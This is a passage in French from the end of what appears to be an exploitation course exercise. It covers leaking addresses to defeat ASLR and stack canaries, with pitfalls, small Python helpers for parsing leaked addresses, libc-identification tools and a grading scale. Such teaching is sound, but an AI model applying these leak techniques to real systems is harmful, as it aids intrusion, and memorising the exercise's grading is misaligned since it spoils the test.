**Explication**: Les 12 bits de poids faible correspondent à l'offset dans la page (alignement 4KB) et ne changent pas avec ASLR. On peut les comparer aux bases de données de libc.

---

## Section 7 : Conseils et Pièges

### Pièges Courants

1. **Confondre stack et libc**: 0x7fff... vs 0x7f...

2. **Oublier le null du canary**: Le reconstituer après leak.

3. **Mauvais parsing de format string**: Attention aux newlines et formatage.

4. **Libc version mismatch**: Toujours vérifier plusieurs symboles.

### Bonnes Pratiques

```python
# Toujours valider les leaks
def validate_leak(value, expected_type):
    detected = identify_leak_type(value)
    assert detected == expected_type, f"Expected {expected_type}, got {detected}"

# Parser les adresses avec précaution
def safe_parse_addr(data):
    # Strip null bytes and newlines
    clean = data.strip(b'\x00\n')
    return u64(clean[:8])
```

---

## Section 8 : Ressources et Références

### Outils
- libc-database: github.com/niklasb/libc-database
- libc.rip: libc.rip (online)
- pwntools: pour automatisation

---

## Barème de Notation

| Critère | Points |
|---------|--------|
| identify_leak_type | 20 |
| detect_canary_pattern | 20 |
| craft_format_string_leak | 15 |
| calculate_bases_from_leak | 25 |
| find_libc_version | 20 |
| **Total** | **100** |
